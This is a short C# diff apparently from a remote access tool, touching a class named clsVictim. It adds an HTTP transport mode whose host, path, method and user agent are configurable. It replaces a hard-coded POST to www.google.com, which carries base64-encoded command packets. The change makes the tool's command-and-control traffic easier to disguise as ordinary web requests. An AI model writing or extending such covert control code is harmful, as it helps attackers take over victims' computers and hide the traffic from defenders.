@@ -32,6 +32,12 @@ namespace winClient48
 
         public enProtocol m_protocol { get; set; }
 
+        //HTTP
+        private string m_szHost { get; set; }
+        private string m_szMethod { get; set; }
+        private string m_szPath { get; set; }
+        private string m_szUA { get; set; }
+
         public BlockingCollection<byte[]> _tlsSendQueue = new BlockingCollection<byte[]>(new ConcurrentQueue<byte[]>());
         private CancellationTokenSource _tlsCts { get; set; }
 
@@ -53,6 +59,18 @@ namespace winClient48
 
             _tlsCts = new CancellationTokenSource();
             _ = Task.Run(() => fnTlsSendLoop(_tlsCts.Token));
+        }
+
+        public clsVictim(Socket socket, string szHost, string szMethod, string szPath, string szUA)
+        {
+            this.socket = socket;
+
+            m_szHost = szHost;
+            m_szMethod = szMethod;
+            m_szPath = szPath;
+            m_szUA = szUA;
+
+            m_protocol = enProtocol.HTTP;
         }
 
         ~clsVictim()
@@ -244,7 +262,7 @@ namespace winClient48
             clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
             string szBody = Convert.ToBase64String(dsp.GetBytes());
 
-            clsHttpReq req = new clsHttpReq("www.google.com", "/", clsHttpReq.enMethod.POST, "", szBody);
+            clsHttpReq req = new clsHttpReq(m_szHost, m_szPath, m_szMethod, m_szUA, szBody);
             Send(req.fnabGetRequest());
         }
 
